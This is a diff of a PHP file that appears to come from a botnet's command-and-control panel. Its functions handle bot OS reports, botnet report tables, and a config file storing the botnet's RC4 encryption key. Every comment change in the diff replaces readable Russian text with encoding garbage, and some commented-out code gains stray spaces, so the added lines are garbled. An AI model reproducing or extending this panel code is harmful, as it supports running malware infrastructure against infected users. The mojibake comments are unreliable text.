@@ -1,30 +1,30 @@
 <?php error_reporting(E_ALL); set_time_limit(0); mb_internal_encoding('UTF-8'); mb_regex_encoding('UTF-8');
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Константы.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RљRѕRЅSЃS, P ° RЅS, C <.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-//Кодовая странци для MySQL.
+//RљRѕRґRѕRІR ° SЏ SЃS, SЂR ° RЅS † Pe RґR "SЏ MySQL.
 define('MYSQL_CODEPAGE', 'utf8');
 define('MYSQL_COLLATE',  'utf8_unicode_ci');
 
-//Ботнет по умолчанию. Менять не рекомендуется.
+//R'RѕS, RЅRμS, RїRѕ SѓRјRѕR "C ‡ P ° RЅReSЋ. RњRμRЅSЏS, SЊ RЅRμ SЂRμRєRѕRјRμRЅRґSѓRμS, SЃSЏ.
 define('DEFAULT_BOTNET', '-- default --');
 
-//Некотрые данные о протоколе.
-define('HEADER_SIZE',      48); //sizeof(BinStorage::STORAGE)
-define('HEADER_MD5',       32); //OFFSETOF(BinStorage::STORAGE, MD5Hash)
-define('ITEM_HEADER_SIZE', 16); //sizeof(BinStorage::ITEM)
+//RќRμRєRѕS, SЂS <Rμ RґR ° RЅRЅS <Rμ Rѕ RїSЂRѕS, RѕRєRѕR "Rμ.
+define('HEADER_SIZE',      48); //sizeof (BinStorage:: STORAGE)
+define('HEADER_MD5',       32); //OFFSETOF (BinStorage:: STORAGE, MD5Hash)
+define('ITEM_HEADER_SIZE', 16); //sizeof (BinStorage:: ITEM)
 
-//Конастанты сгенерированые из defines.php
+//RљRѕRЅR SЃS °, P ° RЅS, C <SЃRіRμRЅRμSЂReSЂRѕRІR ° RЅS <Rμ Pepsi · defines.php
 /*EVAL_BEGIN*/
 global $_COMMON_DEFINE;
 return generateXDefines($_COMMON_DEFINE, 'php')."define('BO_CLIENT_VERSION', '".BO_CLIENT_VERSION."');";
 /*EVAL_END*/
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Добавление заголовков HTTP для предотврашения кэширования браузером.
@@ -33,7 +33,7 @@ function httpNoCacheHeaders()
 {
   header('Expires: Fri, 01 Jan 1990 00:00:00 GMT'); //...
   header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0, pre-check=0, post-check=0'); //HTTP/1.1
-  header('Pragma: no-cache'); // HTTP/1.0
+  header('Pragma: no-cache'); //In HTTP/1.0
 }
 
 /*
@@ -173,7 +173,7 @@ function osDataToString($os_data)
   {
     $data = @unpack('Cversion/Csp/Sbuild/Sarch', $os_data);
     
-    //Базовое название.
+    //P'p ° F · RѕRІRѕRμ RЅR ° F · RІR ° RЅReRμ.
     switch($data['version'])
     {
       case 2: $name = 'XP'; break;
@@ -184,10 +184,10 @@ function osDataToString($os_data)
       case 7: $name = 'Server 2008 R2'; break;
     }
     
-    //Архитектура.
+    //RђSЂS ... Republic, RμRєS, SѓSЂR °.
     if($data['arch'] == 9 /*PROCESSOR_ARCHITECTURE_AMD64*/)$name .= ' x64';
    
-    //Сервиспак.
+    //RЎRμSЂRІReSЃRїR ° Rє.
     if($data['sp'] > 0)$name .= ', SP '.$data['sp'];
   }
   return $name;
@@ -215,7 +215,7 @@ function toSqlSafeMask($str)
 function listReportTables($db)
 {
   $template = 'botnet_reports_';
-  $tsize    = 15;//strlen($template);
+  $tsize    = 15;//strlen ($ template);
   $list = array();
   
   if(($r = @mysql_list_tables($db)))while(($m = @mysql_fetch_row($r)))if(strncmp($template, $m[0], $tsize) === 0 && is_numeric(substr($m[0], $tsize)))$list[] = $m[0];
@@ -373,7 +373,7 @@ function createDir($dir)
 */
 function updateConfig($updateList)
 {
-  //Пытаемся дать себе права.
+  //RџS <C, P ° RμRјSЃSЏ RґR ° C SЊ SЃRμR ± Rμ RїSЂR RІR ° °.
   $file    = defined('FILE_CONFIG') ? FILE_CONFIG : 'system/config.php';
   $oldfile = $file.'.old.php';
   
@@ -381,10 +381,10 @@ function updateConfig($updateList)
   @chmod($file,           0777);
   @chmod($oldfile,        0777);
   
-  //Удаляем старый файл.
+  //RЈRґR ° P "SЏRμRј SЃS, P ° SЂS <P № C" P ° P № P ".
   @unlink($oldfile);
   
-  //переименовывем текущий конфиг.
+  //RїRμSЂRμReRјRμRЅRѕRІS <RІRμRј C RμRєSѓS ‰ PEP number RєRѕRЅS "ReRі.
   if(is_file($file) && !@rename($file, $oldfile))return false;
   else
   {
@@ -417,22 +417,20 @@ function updateConfig($updateList)
                "\$config['botnet_cryptkey_bin'] = array(".implode(', ', rc4Init($cryptKey)).");\n".
                "?>";
 
-    //Сохраняем.
+    //RЎRѕS ... SЂR ° RЅSЏRμRј.
     if(@file_put_contents($file, $cfgData) !== strlen($cfgData))return false;
-    //@chmod(@dirname($file), 0444);
+    //@ Chmod (@ dirname ($ file), 0444);
   }
   return true;
 }
 
-/*
-  Хелпер для updateConfig.
-  
-  IN $updateList - array, список для обналвения.
-  IN $name       - имя переменной.
-  IN $default    - значение по умолчанию.
-  
-  Return - значние переменной.
-*/
+/*  RҐRμR "RїRμSЂ RґR" SЏ updateConfig.
+  
+  IN $ updateList - array, SЃRїReSЃRѕRє RґR "SЏ RѕR RЅR ° ± R" RІRμRЅReSЏ.
+  IN $ name - ReRјSЏ RїRμSЂRμRјRμRЅRЅRѕR №.
+  IN $ default - P · RЅR ° C ‡ RμRЅReRμ RїRѕ SѓRјRѕR "C ‡ P ° RЅReSЋ.
+  
+  Return - P · RЅR ° C ‡ RЅReRμ RїRμSЂRμRјRμRЅRЅRѕR №.*/
 function updateConfigHelper($updateList, $name, $default)
 {
   return isset($updateList[$name]) ? $updateList[$name] : (isset($GLOBALS['config'][$name]) ? $GLOBALS['config'][$name] : $default);
